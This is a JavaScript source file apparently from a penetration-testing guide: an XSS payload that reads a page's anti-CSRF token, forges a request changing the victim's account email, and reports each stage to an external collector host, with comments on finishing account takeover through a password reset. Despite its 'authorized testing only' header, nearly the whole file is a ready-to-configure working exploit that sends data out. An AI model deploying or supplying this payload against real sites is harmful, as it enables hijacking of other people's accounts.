/*
 * account_takeover.js — XSS -> CSRF-token theft -> forced state change -> ATO (guide §26/§27).
 *
 * THE KEY INSIGHT: even with HttpOnly cookies you can't read, your script is ALREADY running
 * in the victim's origin/session. So you don't need the cookie — read the page's anti-CSRF
 * token and perform a privileged, state-changing request (change recovery email, change
 * password, add an API key). That converts XSS into account takeover.
 *
 * AUTHORIZED TESTING ONLY. Demonstrate end-to-end on YOUR OWN two test accounts (attacker A
 * plants the payload, victim B renders it 0-click for stored XSS). Point the new email at an
 * inbox YOU control. Do NOT take over real users' accounts. Revert changes after the PoC.
 *
 * Configure CFG for the target's actual endpoint/field names (inspect the legit request first).
 */
(function () {
  var CFG = {
    collector: "//YOUR.oast.fun/ato",
    attackerEmail: "attacker@MY-TEST-INBOX",     // an inbox YOU control (your own test)
    // The sensitive request to forge. Inspect the real "change email" request and mirror it:
    action: {
      url: "/account/email",                      // e.g. /api/settings/profile, /user/update
      method: "POST",
      contentType: "application/x-www-form-urlencoded", // or "application/json"
      // field names as the app expects:
      emailField: "email",
      csrfField: "csrf_token"
    },
    // Where to find the CSRF token on the page (try each until one resolves):
    csrfSelectors: [
      'input[name="csrf_token"]',
      'input[name="_csrf"]',
      'input[name="authenticity_token"]',
      'meta[name="csrf-token"]'
    ]
  };

  function getCsrf() {
    // 1) DOM inputs / meta
    for (var i = 0; i < CFG.csrfSelectors.length; i++) {
      var el = document.querySelector(CFG.csrfSelectors[i]);
      if (el) return el.value || el.getAttribute("content");
    }
    // 2) Common JS globals
    try { if (window.csrfToken) return window.csrfToken; } catch (e) {}
    try { if (window.__CSRF__) return window.__CSRF__; } catch (e) {}
    // 3) Cookie-mirrored CSRF (double-submit pattern)
    var m = document.cookie.match(/(?:^|;\s*)(?:csrf|xsrf|_csrf)[^=]*=([^;]+)/i);
    return m ? decodeURIComponent(m[1]) : null;
  }

  function report(stage, detail) {
    new Image().src = CFG.collector + "?stage=" + encodeURIComponent(stage) + "&d=" + encodeURIComponent(detail || "");
  }

  var token = getCsrf();
  report("csrf", token ? "found" : "not-found");

  var a = CFG.action;
  var body, headers = {};
  if (a.contentType === "application/json") {
    var obj = {};
    obj[a.emailField] = CFG.attackerEmail;
    if (token) obj[a.csrfField] = token;
    body = JSON.stringify(obj);
    headers["Content-Type"] = "application/json";
  } else {
    var p = new URLSearchParams();
    p.set(a.emailField, CFG.attackerEmail);
    if (token) p.set(a.csrfField, token);
    body = p.toString();
    headers["Content-Type"] = "application/x-www-form-urlencoded";
  }

  // Perform the sensitive action AS THE VICTIM (cookies auto-attached, same-origin).
  fetch(a.url, { method: a.method, credentials: "include", headers: headers, body: body })
    .then(function (r) { return r.text().then(function (t) { return { status: r.status, body: t }; }); })
    .then(function (res) {
      report("action", res.status + " " + res.body.slice(0, 200));
      // Next manual step (do this yourself): trigger "forgot password" so the reset lands
      // in attackerEmail's inbox -> complete reset -> you control the account (guide §27A).
    })
    .catch(function (e) { report("action-error", String(e)); });
})();
